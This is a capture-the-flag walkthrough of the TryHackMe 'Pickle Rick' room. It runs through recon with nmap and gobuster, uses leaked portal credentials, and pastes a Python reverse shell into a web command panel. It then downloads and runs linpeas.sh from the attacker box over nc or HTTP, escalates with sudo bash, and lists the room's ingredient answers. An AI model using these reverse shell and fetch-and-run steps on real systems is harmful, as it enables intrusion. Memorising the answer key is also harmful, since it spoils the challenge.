# Pickle Rick

Make sure to `mkdir picklerick` and also to connect to THM VPN using the
generated config file. Something like `sudo openvpn sudoheader.ovpn`

`export IP=`

## NMAP
`nmap -sC -sV -oA scan/picklerick $IP`

## Gobuster
`gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,cgi,py,html,css,js`

Open up Firefox and go to the web application. If we look

## Creds for `portal.php`   
username:
`R1ckRul3s`

password:
`Wubbalubbadubdub`

Start a `netcat` listener in AttackBox with:
`nc -lvnp 1234`

We see that there is a Command Panel. We can only enter certain commands like `ls` and `echo` that work but `cat` doesn't work.
We can try something like `grep -R .` and  right-clicking on the page to `View Source` but this will output everything available to us.
Let's see if `[[Python]]` or `python3` are available.
Test with `python -c "print('hello')"` shows nothing but with `python3`, we can see the correct output.
Now go to [[pentestmonkey.com]] and search for [[Python]] to copy the string for a `python3` reverse shell.
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

After pressing `Execute` the page should hang and going back to the listener, there should be a shell available to us.

However, this shell is not stable. Let's make that so.
On Target:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Now press "Ctrl+Z" and it should background the shell and kick us back to our AttackBox shell.
Enter the following to get a more stable shell:

```bash
stty raw -echo
fg
export TERM=xterm
```

Now that we got a stable bash shell, we can upload `linpeas.sh` to see what we can escalate.
On AttackBox:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh
chmod +x linpeas.sh
nc -q 0 -lvnp 4444 < $1 &
```

On Target
`nc $IP $PORT > linpeas.sh`

You can also use [[Python]] to host an http server and then have the target download the file.
On AttackBox:
`python3 -m http.server 9000`

On Target:
Make sure to get the AttackBox IP. Replace $IP in this case.
```bash
wget http://$IP:9000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

After it has finished, we see that the user `www-data` has the ability to run any `sudo` command so we can. `sudo bash` To get root.

## Task 1

1. What is the first ingredient Rick needs?
mr. meeseek hair

2. Whats the second ingredient Rick needs?
1 jerry tear

3. Whats the final ingredient Rick needs?
fleeb juice
